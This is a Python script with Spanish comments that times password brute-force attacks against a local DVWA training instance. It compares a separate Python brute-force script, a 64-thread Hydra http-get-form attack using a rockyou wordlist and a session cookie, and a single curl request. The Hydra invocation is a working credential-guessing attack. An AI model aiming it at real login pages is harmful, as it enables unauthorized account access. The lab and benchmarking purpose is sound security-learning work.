import time
import subprocess
import sys

# =================================================================
# CONFIGURACIÓN DEL ENTORNO
# =================================================================
DVWA_URL = "http://localhost:90"
BRUTE_URL_PATH = "/vulnerabilities/brute/"
TARGET_URL = f"{DVWA_URL}{BRUTE_URL_PATH}"

# Archivos de diccionario (asegúrate de que existen)
USERS_FILE = "Users.txt"
PASS_FILE_TAR = "rockyou.txt.tar.gz" # O rockyou.txt si no está comprimido

# ATENCIÓN: DEBES REEMPLAZAR ESTA COOKIE CON UNA SESIÓN VÁLIDA
# Inicia sesión en DVWA y copia el valor de PHPSESSID desde tu navegador
# La seguridad debe estar en 'low'
COOKIE_HEADER = "PHPSESSID=1hcamf972ve6nhki0c6ur24v66; security=low"
CURL_HEADERS = f"H=Cookie:{COOKIE_HEADER}"

# Parámetros de Hydra
HYDRA_THREADS = 64
HYDRA_ERROR_PATTERN = "F=Username and/or password incorrect."

# =================================================================
# FUNCIONES DE EJECUCIÓN Y MEDICIÓN
# =================================================================

def run_python_script():
    """Ejecuta el script Python nativo (brute_force_optimized.py) y mide el tiempo."""
    print("\n--- 1. Python Nativo (Secuencial) ---")
    
    # Comando a ejecutar
    cmd = [sys.executable, 'Brute_v2.py']
    
    start_time = time.time()
    try:
        # Ejecutar y capturar la salida de error (donde se imprime el tiempo)
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        end_time = time.time()
        
        # Buscar el tiempo reportado por el script de ataque (si es que existe)
        python_duration_internal = [line.split('=')[1] for line in result.stderr.split('\n') if 'PYTHON_DURATION' in line]
        
        print(f"  Tiempo medido por Python (time.time()): {end_time - start_time:.4f}s")
        if python_duration_internal:
            print(f"  Duración reportada internamente: {python_duration_internal[0]}s")
        else:
            print("  Nota: No se pudo encontrar la duración reportada internamente.")
        
    except subprocess.CalledProcessError as e:
        print(f"  [x] Error al ejecutar el script Python. Asegúrate de que los diccionarios existen.")
        print(e.stderr)
    except FileNotFoundError:
        print(f"  [x] Error: Asegúrate de que '{cmd[1]}' y sus dependencias existen.")

def run_hydra_attack():
    """Ejecuta el ataque con Hydra y mide el tiempo."""
    print("\n--- 2. Hydra (Paralelo) ---")
    
    # Comando de Hydra
    cmd = [
        "sudo", "hydra",
        "-L", USERS_FILE,
        "-P", PASS_FILE_TAR,
        "-t", str(HYDRA_THREADS), # Número de hilos
        "-s", "90", # Puerto
        "localhost",
        "http-get-form",
        f"{BRUTE_URL_PATH}:username=^USER^&password=^PASS^&Login=Login:{CURL_HEADERS}:{HYDRA_ERROR_PATTERN}"
    ]
    
    print(f"  Comando: {' '.join(cmd)}")
    start_time = time.time()
    try:
        # Ejecutar Hydra y capturar la salida
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        end_time = time.time()
        
        print(f"  Tiempo total de ejecución (Hydra): {end_time - start_time:.4f}s")
        print("\n  [Salida de Hydra (últimas líneas)]")
        print('\n'.join(result.stdout.split('\n')[-5:]))
        
    except subprocess.CalledProcessError as e:
        print(f"  [x] Error al ejecutar Hydra. Revisa la instalación de Hydra y los permisos de sudo.")
        print(e.stderr)
    except FileNotFoundError:
        print("  [x] Error: Asegúrate de que el comando 'hydra' está instalado y en el PATH.")

def run_curl_latency_test():
    """Ejecuta una sola petición con curl para medir la latencia base."""
    print("\n--- 3. Curl (Latencia Base) ---")
    
    # URL de prueba (una sola combinación)
    test_url = f"{TARGET_URL}?username=admin&password=password&Login=Login"
    
    # Comando de Curl con formato de tiempo
    cmd = [
        "sudo", "curl",
        "-s", "-o", "/dev/null", # Silencioso, descarta la salida
        "-w", "\n\tTiempo total de conexión: %{time_total}s\n", # Formato de salida
        test_url,
        "-H", CURL_HEADERS
    ]
    
    start_time = time.time()
    try:
        # Ejecutar Curl
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        end_time = time.time()
        
        print(f"  Tiempo medido por Python (time.time()): {end_time - start_time:.4f}s")
        print(f"  Tiempo reportado por Curl: {result.stdout.strip()}")

    except subprocess.CalledProcessError as e:
        print(f"  [x] Error al ejecutar Curl. Revisa la instalación de Curl y los permisos de sudo.")
        print(e.stderr)
    except FileNotFoundError:
        print("  [x] Error: Asegúrate de que el comando 'curl' está instalado y en el PATH.")

# =================================================================
# BLOQUE DE EJECUCIÓN PRINCIPAL
# =================================================================

if __name__ == "__main__":
    print("============================================================")
    print("      INICIANDO BENCHMARK DE FUERZA BRUTA DESDE PYTHON")
    print("============================================================")
    
    # La parte 1 (Python) requiere que 'brute_force_optimized.py' exista
    # Y que sus diccionarios existan.
    
    run_python_script()
    
    # Las partes 2 y 3 requieren permisos de sudo y las herramientas instaladas
    # Es posible que debas ingresar tu contraseña de sudo durante la ejecución.
    if input("\n[?] ¿Deseas continuar con las pruebas de Hydra y Curl (requiere 'sudo')? (s/n): ").lower() == 's':
        run_hydra_attack()
        run_curl_latency_test()
    else:
        print("\nPruebas de Hydra y Curl omitidas.")

    print("\n============================================================")
    print("BENCHMARK COMPLETADO")
    print("============================================================")